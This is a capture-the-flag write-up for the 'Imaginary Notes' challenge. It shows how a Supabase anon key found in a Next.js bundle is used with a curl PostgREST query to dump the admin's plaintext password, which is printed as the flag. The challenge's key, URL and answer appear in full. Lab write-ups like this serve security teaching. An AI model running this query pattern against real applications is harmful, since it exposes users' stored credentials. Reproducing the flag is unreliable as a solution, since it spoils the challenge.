Imaginary Notes Solution
Challenge
We’re given a note-taking app running on Supabase:
http://imaginary-notes.chal.imaginaryctf.org
The description hints:
•	The flag is the password of the admin account.
•	The database table is called users.
•	The Supabase anonymous key is hidden somewhere in the site.
________________________________________
Recon
Opening the site shows a basic Next.js login/signup page. Checking the page source and loaded JS chunks in DevTools → Sources or Network, we spot this line:
a(5647).UU)("https://dpyxnwiuwzahkxuxrojp.supabase.co",
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRweXhud2l1d3phaGt4dXhyb2pwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTE3NjA1MDcsImV4cCI6MjA2NzMzNjUwN30.C3-ninSkfw0RF3ZHJd25MpncuBdEVUmWpMLZgPZ-rqI");
This exposes both:
•	Supabase URL: https://dpyxnwiuwzahkxuxrojp.supabase.co
•	Anon key: the long JWT.
________________________________________
Exploitation
Supabase exposes its database via a PostgREST API at /rest/v1/<table>.
With the anon key, we can query directly:
curl -s 'https://dpyxnwiuwzahkxuxrojp.supabase.co/rest/v1/users?select=*&username=eq.admin' \
  -H 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
________________________________________
Result
The response reveals the admin row, including the password:
[
  {
    "id": "5df6d541-c05e-4630-a862-8c23ec2b5fa9",
    "username": "admin",
    "password": "ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"
  }
]
________________________________________
Flag
ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}
